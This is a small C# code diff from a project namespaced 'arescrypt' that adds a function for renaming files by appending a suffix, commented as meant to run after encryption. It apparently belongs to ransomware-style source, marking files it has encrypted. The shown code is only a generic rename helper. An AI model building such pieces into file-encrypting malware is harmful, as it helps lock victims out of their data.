@@ -24,5 +24,22 @@ namespace arescrypt
 
             return fileIndex;
         }
+
+        // Append specified suffix to filenames (preferably after encryption)
+        public static bool appendSuffixToFile(string suffix, string filename)
+        {
+            if (filename.Contains(suffix))
+                return false;
+            else
+            {
+                string oldFilename = filename;
+                File.Move(filename, filename + suffix);
+                if (File.Exists(filename + suffix)) // Check if filename was changed. 
+                    return true;
+                else
+                    return false;
+            }
+        }
+
     }
 }
